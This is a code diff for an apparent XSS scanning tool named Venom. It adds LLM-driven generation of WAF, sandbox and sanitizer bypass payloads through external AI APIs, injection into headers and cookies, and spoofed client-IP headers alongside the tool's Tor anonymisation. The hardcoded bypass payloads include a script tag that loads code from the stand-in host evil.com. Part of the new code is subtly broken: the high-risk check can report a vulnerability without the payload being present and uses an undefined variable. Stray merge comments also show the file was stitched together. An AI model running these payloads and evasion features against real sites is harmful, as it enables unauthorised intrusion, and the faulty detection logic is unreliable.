@@ -12,7 +12,7 @@ import tempfile
 import socket
 import json
 import signal
-from urllib.parse import urljoin, urlencode, urlparse, parse_qs
+from urllib.parse import urljoin, urlencode, urlparse, parse_qs, quote
 from bs4 import BeautifulSoup
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
@@ -56,20 +56,6 @@ def setup_logging(verbose: bool, log_output: bool, anonymous: bool):
 RED, GREEN, YELLOW, RESET, BOLD, WHITE = '\033[91m', '\033[92m', '\033[93m', '\033[0m', '\033[1m', '\033[97m'
 ORANGE, BLUE, PURPLE, CYAN = '\033[38;5;208m', '\033[94m', '\033[95m', '\033[96m'
 
-class ThreadSafeCounter:
-    def __init__(self):
-        self.value = 0
-        self.lock = threading.Lock()
-
-    def increment(self):
-        with self.lock:
-            self.value += 1
-            return self.value
-
-    def get(self):
-        with self.lock:
-            return self.value
-
 def sanitize_input(input_str: str) -> str:
     return re.sub(r'[;&|><`]', '', input_str)
 
@@ -87,13 +73,14 @@ def get_banner_and_features() -> str:
 {BLUE}║{RESET}           {CYAN}╚═════╝ ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝{RESET}           {BLUE}║{RESET}
 {BLUE}║{RESET}                                                                    {BLUE}║{RESET}
 {BLUE}║{RESET}                  {PURPLE}Venom Advanced XSS Scanner 2025{RESET}                   {BLUE}║{RESET}
-{BLUE}║{RESET}                            {WHITE}Version 5.48{RESET}                            {BLUE}║{RESET}
+{BLUE}║{RESET}                            {WHITE}Version 5.49{RESET}                            {BLUE}║{RESET}
 {BLUE}╚════════════════════════════════════════════════════════════════════╝{RESET}
 """
     features = [
         f"{WHITE}{BOLD}Advanced XSS detection with extended event handlers{RESET}",
         f"{WHITE}{BOLD}Parallel payload testing with adaptive throttling{RESET}",
         f"{WHITE}{BOLD}Custom payload integration from /usr/local/bin/payloads/{RESET}",
+        f"{WHITE}{BOLD}LLM Prompt-Wiz for dynamic payload generation and analysis{RESET}",
         f"{WHITE}{BOLD}AI-driven payload optimization with WAF/403 bypass{RESET}",
         f"{WHITE}{BOLD}Subdomain scanning with HTTP/HTTPS support{RESET}",
         f"{WHITE}{BOLD}Comprehensive parameter testing for XSS{RESET}",
@@ -108,7 +95,7 @@ def get_banner_and_features() -> str:
 def parse_args() -> argparse.Namespace:
     banner_and_features = get_banner_and_features()
     description = f"""{banner_and_features}
-Venom Advanced XSS Scanner is a tool for ethical penetration testers to detect XSS vulnerabilities. Version 5.48 supports over 8000 payloads, extended event handlers, AI-driven WAF/403 bypass, sandbox and sanitizer bypasses, and enhanced subdomain scanning for both HTTP and HTTPS, considering 200 and 403 status codes as live.
+Venom Advanced XSS Scanner is a tool for ethical penetration testers to detect XSS vulnerabilities. Version 5.49 supports over 8000 payloads, extended event handlers, AI-driven WAF/403 bypass, sandbox and sanitizer bypasses, and enhanced subdomain scanning for both HTTP and HTTPS, considering 200 and 403 status codes as live. With --llm-prompt-wiz, leverage advanced LLM-driven prompt engineering for dynamic payload generation and vulnerability analysis.
 
 Usage:
   python3 venom.py <url> --scan-xss [options]
@@ -143,7 +130,8 @@ Options:
 
   AI Assistance:
     --ai-assist             Enable AI-driven payload optimization.
-    --ai-platform           AI platform: xai-grok, openai-gpt3, google-gemini.
+    --llm-prompt-wiz        Enable LLM Prompt-Wiz mode for advanced payload generation and analysis (requires --ai-platform and --ai-key).
+    --ai-platform           AI platform: xai-grok, openai-gpt3, openai-gpt4, google-gemini.
     --ai-key                API key for AI platform.
 
   Output and Logging:
@@ -171,13 +159,14 @@ Examples:
     - Anonymous subdomain scan with Tor, 10 workers.
   python3 venom.py http://site.com --scan-xss --ai-assist --ai-platform xai-grok --ai-key YOUR_KEY --export-report report.json
     - AI-optimized scan with JSON report.
+  python3 venom.py http://example.com --scan-xss --llm-prompt-wiz --ai-platform xai-grok --ai-key YOUR_KEY --verbose
+    - Scan with LLM Prompt-Wiz for advanced payload generation and analysis.
   python3 venom.py http://example.com --scan-xss --stealth --use-403-bypass --proxy socks5://localhost:9050
     - Stealth scan with 403 bypass via SOCKS5 proxy.
   python3 venom.py https://app.com --scan-xss --subdomains subs.txt --extended-events --bypass-sandbox --bypass-sanitizer --extra-params "email,search" --verbose
     - Detailed scan with subdomains, extended events, sandbox/sanitizer bypasses, and custom parameters.
 
 Note: legal disclaimer: Usage of venom for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
 """
     
     parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
@@ -209,9 +198,10 @@ Note: legal disclaimer: Usage of venom for attacking targets without prior mutua
     parser.add_argument("--use-tor", action="store_true", help="Route traffic through Tor (requires Tor on port 9050).")
     parser.add_argument("--proxy", type=str, help="Use a proxy (e.g., 'socks5://localhost:9050' or 'http://proxy:port').")
     parser.add_argument("--disable-ssl-verify", action="store_true", help="Disable SSL certificate verification for anonymity (use with caution).")
-    parser.add_argument("--ai-assist", action="store_true", help="Enable AI-driven payload optimization and WAF/403 bypass.")
-    parser.add_argument("--ai-key", type=str, help="API key for external AI platform (required if --ai-platform is used).")
-    parser.add_argument("--ai-platform", type=str, choices=['xai-grok', 'openai-gpt3', 'google-gemini'],
+    parser.add_argument("--ai-assist", action="store_true", help="Enable AI-driven payload optimization.")
+    parser.add_argument("--llm-prompt-wiz", action="store_true", help="Enable LLM Prompt-Wiz mode for advanced payload generation and analysis (requires --ai-platform and --ai-key).")
+    parser.add_argument("--ai-key", type=str, help="API key for external AI platform (required if --ai-platform or --llm-prompt-wiz is used).")
+    parser.add_argument("--ai-platform", type=str, choices=['xai-grok', 'openai-gpt3', 'openai-gpt4', 'google-gemini'],
                         help="External AI platform for optimization (requires --ai-key).")
     parser.add_argument("--log-output", action="store_true", help="Enable console logging alongside file (overrides anonymous mode restriction).")
     parser.add_argument("--extended-events", action="store_true", help="Use extended event handlers (onmouseover, onclick, etc.).")
@@ -257,6 +247,9 @@ Note: legal disclaimer: Usage of venom for attacking targets without prior mutua
     if args.ai_platform and not args.ai_key:
         print(f"{RED}[!] --ai-platform requires --ai-key. Exiting.{RESET}")
         sys.exit(1)
+    if args.llm_prompt_wiz and not (args.ai_platform and args.ai_key):
+        print(f"{RED}[!] --llm-prompt-wiz requires --ai-platform and --ai-key. Exiting.{RESET}")
+        sys.exit(1)
     if args.anonymous and not (args.use_tor or args.proxy):
         print(f"{RED}[!] --anonymous requires --use-tor or --proxy for IP anonymization. Exiting.{RESET}")
         sys.exit(1)
@@ -269,6 +262,8 @@ Note: legal disclaimer: Usage of venom for attacking targets without prior mutua
         print(f"{GREEN}[+] Proxy enabled: {args.proxy}{RESET}")
     if args.ai_assist:
         print(f"{GREEN}[+] AI assistance enabled{RESET}")
+    if args.llm_prompt_wiz:
+        print(f"{GREEN}[+] LLM Prompt-Wiz mode enabled with platform: {args.ai_platform}{RESET}")
     if args.extended_events:
         print(f"{GREEN}[+] Extended event handlers enabled{RESET}")
     if args.bypass_sandbox:
@@ -354,20 +349,39 @@ def reset_tor_circuit():
     except Exception as e:
         logging.error(f"Failed to reset Tor circuit: {e}")
 
+# Start of Part 2
+class ThreadSafeCounter:
+    def __init__(self):
+        self.value = 0
+        self.lock = threading.Lock()
+
+    def increment(self):
+        with self.lock:
+            self.value += 1
+            return self.value
+
+    def get(self):
+        with self.lock:
+            return self.value
+
 class AIAssistant:
     def __init__(self, payloads: List[str], api_key: Optional[str] = None, platform: Optional[str] = None, 
-                 extended_events: bool = False, bypass_sandbox: bool = False, bypass_sanitizer: bool = False):
+                 extended_events: bool = False, bypass_sandbox: bool = False, bypass_sanitizer: bool = False,
+                 llm_prompt_wiz: bool = False):
         self.payloads = payloads
         self.api_key = api_key
         self.platform = platform
         self.extended_events = extended_events
         self.bypass_sandbox = bypass_sandbox
         self.bypass_sanitizer = bypass_sanitizer
+        self.llm_prompt_wiz = llm_prompt_wiz
         self.api_endpoint = self.get_api_endpoint() if platform else None
         self.success_history: Dict[str, dict] = {}
         self.lock = threading.Lock()
         self.vectorizer = TfidfVectorizer()
-        if self.api_key and self.api_endpoint:
+        if self.api_key and self.api_endpoint and self.llm_prompt_wiz:
+            logging.info(f"LLM Prompt-Wiz enabled with platform: {platform}")
+        elif self.api_key and self.api_endpoint:
             logging.info(f"AI assistance enabled with external platform: {platform}")
         else:
             logging.info("AI assistance enabled with local ML optimization")
@@ -376,12 +390,99 @@ class AIAssistant:
         endpoints = {
             "xai-grok": "https://api.xai.com/v1/completions",
             "openai-gpt3": "https://api.openai.com/v1/completions",
+            "openai-gpt4": "https://api.openai.com/v1/chat/completions",
             "google-gemini": "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent"
         }
         return endpoints.get(self.platform, "https://api.xai.com/v1/completions")
 
+    def query_llm(self, prompt: str) -> Optional[str]:
+        """Send a prompt to the LLM and return the response."""
+        try:
+            headers = {"Authorization": f"Bearer {self.api_key}"}
+            data = {
+                "model": self.platform if self.platform != "xai-grok" else "grok-3",
+                "prompt": prompt,
+                "max_tokens": 500,
+                "temperature": 0.7
+            }
+            if self.platform.startswith("openai"):
+                data = {
+                    "model": "gpt-4" if self.platform == "openai-gpt4" else "gpt-3.5-turbo",
+                    "messages": [{"role": "user", "content": prompt}],
+                    "max_tokens": 500,
+                    "temperature": 0.7
+                }
+            elif self.platform == "google-gemini":
+                data = {"contents": [{"parts": [{"text": prompt}]}]}
+
+            response = requests.post(self.api_endpoint, headers=headers, json=data, timeout=10)
+            response.raise_for_status()
+            if self.platform.startswith("openai"):
+                return response.json()["choices"][0]["message"]["content"].strip()
+            elif self.platform == "google-gemini":
+                return response.json()["candidates"][0]["content"]["parts"][0]["text"].strip()
+            else:
+                return response.json()["choices"][0]["text"].strip()
+        except RequestException as e:
+            logging.error(f"LLM query failed: {e}")
+            return None
+
+    def generate_payload_prompt(self, response: Optional[str] = None, status_code: int = 200, 
+                              waf_detected: bool = False, waf_type: str = "Unknown") -> str:
+        """Craft a prompt for generating XSS payloads."""
+        context = "HTML content" if response and ('<input' in response or '<form' in response) else \
+                  "JavaScript context" if response and ('<script' in response or 'onload' in response) else "Unknown"
+        prompt = f"""
+You are an ethical penetration testing assistant specializing in XSS vulnerability detection. Generate 10 unique XSS payloads tailored for a web application, considering the following:
+- Target context: {context}.
+- {'WAF detected: ' + waf_type + '. Suggest bypass techniques.' if waf_detected else 'No WAF detected.'}
+- {'Include extended event handlers (e.g., onmouseover, onclick, onpointerrawupdate) for HTML contexts.' if self.extended_events else 'Use basic event handlers (e.g., onerror, onload).'}
+- {'Bypass browser sandboxes or CSP (e.g., using iframe, meta refresh, or srcdoc).' if self.bypass_sandbox else 'No sandbox bypass required.'}
+- {'Bypass HTML sanitizers (e.g., DOMPurify, server-side filters) with obscure tags or encodings.' if self.bypass_sanitizer else 'No sanitizer bypass required.'}
+- Response status: {status_code}.
+- Payloads must be safe for testing and avoid malicious actions beyond alert('xss') or confirm('xss').
+- Format output as a JSON list: ["payload1", "payload2", ...].
+
+Example response:
+["<script>alert('xss')</script>", "<img src=x onerror=alert('xss')>", ...]
+"""
+        if response:
+            prompt += f"\nResponse snippet for context (truncated to 500 chars):\n{response[:500]}"
+        return prompt
+
+    def analyze_response_prompt(self, payload: str, response: str) -> str:
+        """Craft a prompt to analyze if a response indicates a vulnerability."""
+        prompt = f"""
+You are an ethical penetration testing assistant. Analyze the following web response to determine if the XSS payload '{payload}' is reflected and executable, indicating a vulnerability. Consider:
+- Is the payload present unescaped in HTML, JavaScript, or event handlers (e.g., onerror, onclick)?
+- Is it in an executable context (e.g., <script>, onmouseover, srcdoc, javascript:)?
+- Are there signs of sandbox or sanitizer bypass (e.g., meta refresh, obscure tags)?
+Return a JSON object: {{ "vulnerable": boolean, "context": string, "details": string }}.
+
+Response snippet (truncated to 1000 chars):
+{response[:1000]}
+"""
+        return prompt
+
+    def suggest_bypass_prompt(self, waf_type: str, response: str) -> str:
+        """Craft a prompt to suggest WAF or defense bypass techniques."""
+        prompt = f"""
+You are an ethical penetration testing assistant. Suggest 5 techniques to bypass a {waf_type} WAF or defense mechanism for XSS testing, based on the response below. Techniques must:
+- Be safe for ethical testing (e.g., use alert('xss') for verification).
+- Include encoding, event handler variations, or obscure tags if applicable.
+- {'Use extended event handlers (e.g., onmouseover, onpointerrawupdate) if possible.' if self.extended_events else 'Use standard event handlers.'}
+- {'Target sandbox bypass (e.g., iframe, meta refresh, srcdoc).' if self.bypass_sandbox else 'No sandbox bypass needed.'}
+- {'Target sanitizer bypass (e.g., obscure tags, malformed HTML).' if self.bypass_sanitizer else 'No sanitizer bypass needed.'}
+Format output as a JSON list: ["technique1", "technique2", ...].
+
+Response snippet (truncated to 500 chars):
+{response[:500]}
+"""
+        return prompt
+
     def suggest_payloads(self, response: Optional[str] = None, status_code: int = 200, 
                         waf_detected: bool = False, waf_type: str = "Unknown") -> List[str]:
+        """Generate or optimize payloads, using LLM Prompt-Wiz if enabled."""
         executable_payloads = [p for p in self.payloads if any(x in p.lower() for x in ['alert(', 'on', 'confirm(', 'javascript:'])]
         other_payloads = [p for p in self.payloads if p not in executable_payloads]
         
@@ -392,19 +493,48 @@ class AIAssistant:
         ]
         prioritized = basic_payloads + executable_payloads
         
+        if self.llm_prompt_wiz and self.api_key and self.api_endpoint:
+            # Use LLM Prompt-Wiz for dynamic payload generation
+            prompt = self.generate_payload_prompt(response, status_code, waf_detected, waf_type)
+            llm_response = self.query_llm(prompt)
+            if llm_response:
+                try:
+                    new_payloads = json.loads(llm_response)
+                    if isinstance(new_payloads, list):
+                        prioritized = new_payloads + prioritized
+                        logging.info(f"LLM Prompt-Wiz generated {len(new_payloads)} new payloads")
+                    else:
+                        logging.warning("LLM returned invalid payload format")
+                except json.JSONDecodeError:
+                    logging.error("Failed to parse LLM payload response")
+            else:
+                logging.warning("LLM query failed, falling back to static payloads")
+        
         if waf_detected:
             bypass_payloads = [
                 "<scr"+"ipt>alert('xss')</script>",
                 "%253Cscript%253Ealert('xss')%253C/script%253E",
                 "<script>eval(atob('YWxlcnQoJ3hzcycp'))</script>"
             ]
+            if self.llm_prompt_wiz and self.api_key and self.api_endpoint:
+                # Use LLM Prompt-Wiz for WAF bypass suggestions
+                prompt = self.suggest_bypass_prompt(waf_type, response or "")
+                llm_response = self.query_llm(prompt)
+                if llm_response:
+                    try:
+                        bypass_suggestions = json.loads(llm_response)
+                        if isinstance(bypass_suggestions, list):
+                            bypass_payloads.extend(bypass_suggestions)
+                            logging.info(f"LLM Prompt-Wiz suggested {len(bypass_suggestions)} bypass techniques")
+                    except json.JSONDecodeError:
+                        logging.error("Failed to parse LLM bypass response")
             if waf_type == "Cloudflare":
                 bypass_payloads.append("<script src=//evil.com></script>")
             elif waf_type == "AWS WAF":
                 bypass_payloads.append("<input onpointerover=alert('xss')>")
             elif waf_type == "ModSecurity":
                 bypass_payloads.append("<script>/*foo*/alert('xss')/*bar*/</script>")
-            return bypass_payloads + prioritized[:20]
+            prioritized = bypass_payloads + prioritized
         
         if self.bypass_sandbox:
             sandbox_payloads = [
@@ -454,6 +584,7 @@ class AIAssistant:
         return list(set(executable_payloads + other_payloads[:20]))
 
     def record_success(self, payload: str, context: str = "unknown", status_code: int = 200) -> None:
+        """Record successful payloads and analyze with LLM if Prompt-Wiz is enabled."""
         with self.lock:
             if payload not in self.success_history:
                 self.success_history[payload] = {"success_count": 0, "weight": 0.0, "context": context}
@@ -461,7 +592,23 @@ class AIAssistant:
                 self.success_history[payload]["success_count"] += 1
                 self.success_history[payload]["weight"] = min(1.0, self.success_history[payload]["weight"] + 0.2)
                 self.success_history[payload]["context"] = context
+            if self.llm_prompt_wiz and self.api_key and self.api_endpoint:
+                # Use LLM to analyze why this payload succeeded
+                prompt = self.analyze_response_prompt(payload, context)
+                llm_response = self.query_llm(prompt)
+                if llm_response:
+                    try:
+                        analysis = json.loads(llm_response)
+                        if analysis.get("vulnerable"):
+                            logging.info(f"LLM Prompt-Wiz confirmed vulnerability: {analysis['details']}")
+                        else:
+                            logging.debug(f"LLM Prompt-Wiz analysis: {analysis['details']}")
+                    except json.JSONDecodeError:
+                        logging.error("Failed to parse LLM response analysis")
+                        # Import dependencies from File 1 (remove this when combining into a single file)
+#from venom_part1_part2 import *
 
+# Start of Part 3
 class PayloadGenerator:
     def __init__(self, payloads_dir: str, payload_file: Optional[str] = None, bypass_needed: bool = False, 
                  use_403_bypass: bool = False, stealth: bool = False, extended_events: bool = False, 
@@ -618,6 +765,7 @@ class PayloadGenerator:
     def update_success(self, payload: str):
         self.previous_success.append(payload)
 
+# Start of Part 4
 class Venom:
     def __init__(self, args: argparse.Namespace):
         self.args = args
@@ -634,7 +782,12 @@ class Venom:
                 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)'
             ]),
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5'
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Referer': 'https://example.com',  # Default Referer for testing
+            'X-Forwarded-For': '127.0.0.1',
+            'X-Real-IP': '127.0.0.1',
+            'Origin': 'https://example.com',
+            'X-Requested-With': 'XMLHttpRequest'
         })
 
         self.proxies = None
@@ -700,13 +853,22 @@ class Venom:
         self.use_403_bypass = args.use_403_bypass
         self.is_waf_detected = False
         self.active_params = []
-        self.extra_params = args.extra_params.split(',') if args.extra_params else ['email', 'id', 'search', 'name', 'username', 'message', 'test']
+        # Expanded extra_params with new general parameters, JS candidates, and metadata
+        self.extra_params = args.extra_params.split(',') if args.extra_params else [
+            'q', 's', 'search', 'query', 'id', 'name', 'title', 'msg', 'message', 'comment', 'text', 'content',
+            'input', 'email', 'username', 'user', 'page', 'redirect', 'url', 'lang', 'locale', 'next', 'return',
+            'callback', 'cb', 'jsonp', 'onload', 'onerror', 'onclick', 'onmouseover', 'src', 'href', 'style',
+            'data', 'html', 'desc', 'description', 'meta', 'keywords', 'tooltip', 'label', 'placeholder', 'img',
+            'image', 'avatar', 'icon'
+        ]
         self.subdomains = self.load_subdomains() if args.subdomains else []
         self.rate_limit_detected = False
         self.dns_failure_count = 0
         self.dns_cache = {}
         self.live_subdomains = []
         self.forbidden_subdomains = []
+        self.test_headers = ['Referer', 'User-Agent', 'X-Forwarded-For', 'Host', 'X-Real-IP', 'Origin', 'Accept-Language', 'X-Requested-With']
+        self.test_cookies = ['session', 'token', 'user', 'id', 'callback']
 
         self.initial_waf_ips_check()
         self.payload_generator = PayloadGenerator(
@@ -717,8 +879,9 @@ class Venom:
         self.payloads = self.payload_generator.generate()
         self.ai_assistant = AIAssistant(
             self.payloads, self.args.ai_key, self.args.ai_platform, 
-            self.args.extended_events, self.args.bypass_sandbox, self.args.bypass_sanitizer
-        ) if args.ai_assist else None
+            self.args.extended_events, self.args.bypass_sandbox, self.args.bypass_sanitizer,
+            self.args.llm_prompt_wiz
+        ) if args.ai_assist or args.llm_prompt_wiz else None
         if self.ai_assistant:
             self.payloads = self.ai_assistant.suggest_payloads(waf_detected=self.is_waf_detected, waf_type=self.waf_type)
         self.total_payloads = len(self.payloads)
@@ -898,6 +1061,14 @@ class Venom:
                         urls.add(absolute_url)
                         method = form.get('method', 'get').lower()
                         self.task_queue.put((absolute_url, method, self.extract_form_data(form)))
+            # Check for JSONP endpoints
+            for script in soup.find_all('script', src=True):
+                src = script['src']
+                if 'callback=' in src or 'cb=' in src or 'jsonp=' in src:
+                    absolute_url = urljoin(base_url, src)
+                    if urlparse(absolute_url).netloc == self.domain and absolute_url not in self.visited_urls:
+                        urls.add(absolute_url)
+                        self.task_queue.put((absolute_url, 'get', {}))
             logging.info(f"Crawled {len(urls)} URLs from {base_url}")
         except RequestException as e:
             logging.error(f"Crawl failed for {base_url}: {e}")
@@ -915,7 +1086,8 @@ class Venom:
     def extract_params(self, url: str, response_text: str) -> List[str]:
         params = set(parse_qs(urlparse(url).query).keys())
         soup = BeautifulSoup(response_text, 'html.parser')
-        for tag in soup.find_all(['input', 'textarea', 'select', 'button', 'a']):
+        # Extract parameters from HTML tags
+        for tag in soup.find_all(['input', 'textarea', 'select', 'button', 'a', 'meta', 'img']):
             if tag.get('name'):
                 params.add(tag['name'])
             if tag.get('id'):
@@ -923,27 +1095,54 @@ class Venom:
             if tag.name == 'a' and 'href' in tag.attrs:
                 href_params = parse_qs(urlparse(tag['href']).query).keys()
                 params.update(href_params)
+            if tag.name == 'meta' and 'name' in tag.attrs:
+                params.add(tag['name'])
+            for attr in ['desc', 'description', 'keywords', 'tooltip', 'label', 'placeholder', 'image', 'avatar', 'icon']:
+                if tag.get(attr):
+                    params.add(attr)
+        # Extract parameters from script tags (e.g., JSONP, DOM manipulation)
+        for script in soup.find_all('script'):
+            script_text = script.get_text()
+            for param in ['callback', 'cb', 'jsonp']:
+                if param in script_text:
+                    params.add(param)
         if self.args.all_params:
             for tag in soup.find_all(True):
                 for attr in tag.attrs:
-                    if attr in ['name', 'id', 'data-name', 'class']:
+                    if attr in ['name', 'id', 'data-name', 'class', 'onload', 'onerror', 'onclick', 'onmouseover',
+                                'src', 'href', 'style', 'data', 'html']:
                         value = tag[attr]
                         if isinstance(value, list):
                             params.update(str(v) for v in value)
                         else:
                             params.add(str(value))
+        # Add extra parameters
         for extra_param in self.extra_params:
             params.add(extra_param)
+        # Add URL fragment parameters
+        parsed_url = urlparse(url)
+        if parsed_url.fragment:
+            fragment_params = parse_qs(parsed_url.fragment)
+            params.update(fragment_params.keys())
         self.active_params = list(params)
         logging.debug(f"Extracted {len(self.active_params)} parameters from {url}: {self.active_params}")
         return self.active_params
 
-    def inject_payload(self, url: str, method: str, payload: str, param: str = None, data: Dict[str, str] = None) -> tuple[Optional[str], int]:
+    def inject_payload(self, url: str, method: str, payload: str, param: str = None, data: Dict[str, str] = None,
+                      header: str = None, cookie: str = None) -> tuple[Optional[str], int]:
         retries = 10
         response_text = None
         status_code = 0
         for attempt in range(retries):
             try:
+                headers = self.session.headers.copy()
+                cookies = self.session.cookies.get_dict().copy()
+                if header:
+                    headers[header] = payload
+                    logging.debug(f"Injecting payload '{payload}' into header {header}")
+                if cookie:
+                    cookies[cookie] = payload
+                    logging.debug(f"Injecting payload '{payload}' into cookie {cookie}")
                 if method.lower() == 'get':
                     target_url = url
                     if param:
@@ -951,12 +1150,12 @@ class Venom:
                         query = parse_qs(parsed.query)
                         query[param] = payload
                         target_url = parsed._replace(query=urlencode(query, doseq=True)).geturl()
-                    response = self.session.get(target_url, timeout=self.args.timeout)
+                    response = self.session.get(target_url, headers=headers, cookies=cookies, timeout=self.args.timeout)
                 else:
                     data = data.copy() if data else self.post_data.copy()
                     if param:
                         data[param] = payload
-                    response = self.session.post(url, data=data, timeout=self.args.timeout)
+                    response = self.session.post(url, data=data, headers=headers, cookies=cookies, timeout=self.args.timeout)
                 logging.debug(f"Injected payload '{payload}' into {url} ({method}) - Status: {response.status_code}")
                 if response.status_code in [403, 429] and not self.is_waf_detected:
                     self.is_waf_detected = True
@@ -1002,12 +1201,12 @@ class Venom:
             
             payloads = self.ai_assistant.suggest_payloads(response.text, response.status_code, self.is_waf_detected, self.waf_type) if self.ai_assistant else self.payload_generator.generate()
             
-            def test_payload(param, payload):
+            def test_payload(param, payload, header=None, cookie=None):
                 self.current_payload = payload
-                self.current_param = param
+                self.current_param = param if param else (header if header else cookie)
                 self.current_method = method.upper()
                 self.current_cookie = "Hidden" if self.args.anonymous else str(self.session.cookies.get_dict())
-                resp_text, status = self.inject_payload(url, method, payload, param, data)
+                resp_text, status = self.inject_payload(url, method, payload, param, data, header, cookie)
                 test_count = self.total_tests.increment()
                 
                 if status == 429 and not self.rate_limit_detected:
@@ -1027,9 +1226,10 @@ class Venom:
                         snippet = resp_text[max(0, start_idx-50):start_idx+len(payload)+50] if start_idx != -1 else "Not found in full text"
                         vuln = {
                             'url': url,
-                            'full_url': url + '?' + urlencode({param: payload}) if method.lower() == 'get' else url,
+                            'full_url': url + '?' + urlencode({param: payload}) if method.lower() == 'get' and param else url,
                             'method': method.upper(),
-                            'param': param,
+                            'param': param if param else (header if header else cookie),
+                            'location': 'query' if param else ('header' if header else 'cookie'),
                             'payload': payload,
                             'type': "Reflected XSS",
                             'context': context,
@@ -1038,20 +1238,32 @@ class Venom:
                         }
                         with self.lock:
                             self.vulnerabilities.append(vuln)
-                        logging.info(f"Vulnerability found at {url} - Param: {param} - Payload: {payload} - Context: {context}")
+                        logging.info(f"Vulnerability found at {url} - Param: {param or header or cookie} - Payload: {payload} - Context: {context}")
                         if self.ai_assistant:
                             self.ai_assistant.record_success(payload, resp_text[:500], status)
                 
                 time.sleep(random.uniform(self.args.min_delay, self.args.max_delay))
 
             with ThreadPoolExecutor(max_workers=min(10, self.args.workers)) as executor:
-                futures = [executor.submit(test_payload, param, payload) for param in params for payload in payloads[:50]]
+                futures = []
+                # Test query and POST parameters
+                for param in params:
+                    for payload in payloads[:50]:
+                        futures.append(executor.submit(test_payload, param, payload))
+                # Test headers
+                for header in self.test_headers:
+                    for payload in payloads[:50]:
+                        futures.append(executor.submit(test_payload, None, payload, header=header))
+                # Test cookies
+                for cookie in self.test_cookies:
+                    for payload in payloads[:50]:
+                        futures.append(executor.submit(test_payload, None, payload, cookie=cookie))
                 for future in futures:
                     try:
                         future.result()
                     except Exception as e:
                         logging.error(f"Payload test failed: {e}")
-        
+
         except RequestException as e:
             logging.error(f"Scan failed for {url}: {e}")
             print(f"{YELLOW}[!] Skipping {url} due to error: {e}. Continuing with remaining tasks.{RESET}")
@@ -1082,12 +1294,13 @@ class Venom:
             if current_time - self.last_display_time >= 1 and not self.args.no_live_status:
                 elapsed = current_time - self.start_time
                 tests_per_sec = self.total_tests.get() / elapsed if elapsed > 0 else 0
+                llm_status = "Active" if self.args.llm_prompt_wiz else "Inactive"
                 status = f"""
 {BLUE}╔════ Venom Live Status @ {time.strftime('%H:%M:%S')} ═════════════════════════════════════╗{RESET}
 {BLUE}║{RESET} Tests Run: {YELLOW}{self.total_tests.get():>5}{RESET} | Payloads: {YELLOW}{self.total_payloads}{RESET} | Vulns: {RED}{len(self.vulnerabilities)}{RESET} | Speed: {GREEN}{tests_per_sec:.2f} t/s{RESET}
 {BLUE}║{RESET} Current: {CYAN}{self.current_method} {self.current_param}={self.current_payload}{RESET}
 {BLUE}║{RESET} Cookies: {WHITE}{self.current_cookie}{RESET}
-{BLUE}║{RESET} WAF/IPS: {ORANGE}{self.waf_ips_status} ({self.waf_type}){RESET} | Bypass: {GREEN}{'Active' if self.bypass_performed else 'Inactive'}{RESET}
+{BLUE}║{RESET} WAF/IPS: {ORANGE}{self.waf_ips_status} ({self.waf_type}){RESET} | LLM Prompt-Wiz: {GREEN}{llm_status}{RESET}
 {BLUE}║{RESET} Workers: {PURPLE}{self.args.workers}{RESET} | Domain: {WHITE}{self.domain}{RESET} | DNS Fails: {YELLOW}{self.dns_failure_count}{RESET}
 {BLUE}╚════════════════════════════════════════════════════════════════════════════════════╝{RESET}
 """
@@ -1186,6 +1399,7 @@ class Venom:
                 print(f"{GREEN}║{RESET}    Full URL: {WHITE}{vuln['full_url']}{RESET}")
                 print(f"{GREEN}║{RESET}    Method: {CYAN}{vuln['method']}{RESET}")
                 print(f"{GREEN}║{RESET}    Parameter: {YELLOW}{vuln['param']}{RESET}")
+                print(f"{GREEN}║{RESET}    Location: {YELLOW}{vuln['location']}{RESET}")
                 print(f"{GREEN}║{RESET}    Payload: {PURPLE}{vuln['payload']}{RESET}")
                 print(f"{GREEN}║{RESET}    Context: {ORANGE}{vuln['context']}{RESET}")
                 print(f"{GREEN}║{RESET}    Status Code: {YELLOW}{vuln['status_code']}{RESET}")
@@ -1214,9 +1428,9 @@ class Venom:
                     }, f, indent=4, ensure_ascii=False)
             elif filename.endswith('.csv'):
                 with open(filename, 'w', encoding='utf-8') as f:
-                    f.write("URL,Full URL,Method,Parameter,Payload,Type,Context,Status Code,Response Snippet\n")
+                    f.write("URL,Full URL,Method,Parameter,Location,Payload,Type,Context,Status Code,Response Snippet\n")
                     for vuln in self.vulnerabilities:
-                        f.write(f"{vuln['url']},{vuln['full_url']},{vuln['method']},{vuln['param']},\"{vuln['payload']}\",{vuln['type']},{vuln['context']},{vuln['status_code']},\"{vuln['response_snippet']}\"\n")
+                        f.write(f"{vuln['url']},{vuln['full_url']},{vuln['method']},{vuln['param']},{vuln['location']},\"{vuln['payload']}\",{vuln['type']},{vuln['context']},{vuln['status_code']},\"{vuln['response_snippet']}\"\n")
             logging.info(f"Report exported to {filename}")
         except Exception as e:
             logging.error(f"Failed to export report to {filename}: {e}")
@@ -1231,6 +1445,9 @@ def is_reflected(payload: str, response_text: str, soup: BeautifulSoup) -> tuple
             script_text = script.get_text()
             if payload in script_text and not script.get('src'):
                 return True, "Inside <script> tag (executable)"
+            # Check for high-risk patterns
+            if any(func in script_text.lower() for func in ['eval(', 'settimeout(', 'innerhtml', 'document.write(']):
+                return True, f"Inside <script> tag with high-risk pattern ({func})"
 
         for tag in soup.find_all(True):
             for attr, value in tag.attrs.items():
@@ -1240,6 +1457,8 @@ def is_reflected(payload: str, response_text: str, soup: BeautifulSoup) -> tuple
                     return True, f"Inside {attr} attribute (javascript:)"
                 elif attr == 'srcdoc' and payload in value:
                     return True, "Inside iframe srcdoc (potential sandbox bypass)"
+                elif attr == 'innerHTML' and payload in value:
+                    return True, "Inside innerHTML (high-risk DOM injection)"
 
         meta_tags = soup.find_all('meta', attrs={'http-equiv': 'refresh'})
         for meta in meta_tags:
